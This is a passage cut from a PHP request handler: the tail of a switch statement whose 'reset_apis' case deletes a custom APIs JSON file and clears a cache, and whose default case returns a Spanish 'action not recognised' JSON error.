        break;

    case 'reset_apis':
        $f = DATA_DIR . '/custom_apis.json';
        if (file_exists($f)) unlink($f);
        clearMethodsCache();
        echo json_encode(['success' => true]);
        break;

    default:
        echo json_encode(['success' => false, 'message' => 'Acción no reconocida.']);
        break;
}
